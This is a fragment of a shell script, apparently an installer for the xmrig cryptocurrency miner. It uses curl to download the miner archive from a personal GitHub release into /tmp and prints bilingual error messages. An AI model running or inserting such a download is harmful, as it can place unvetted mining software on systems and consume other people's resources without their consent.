...
if [ "$PORT" -lt "5342" -o "$PORT" -gt "5342" ]; then
...
if ! curl -L --progress-bar "https://github.com/878088/mak/releases/download/Oracle/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download https://github.com/878088/mak/releases/download/Oracle/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
  echo "发生错误: 无法下载 https://github.com/878088/mak/releases/download/Oracle/xmrig.tar.gz 文件到 /tmp/xmrig.tar.gz"
  exit 1
fi
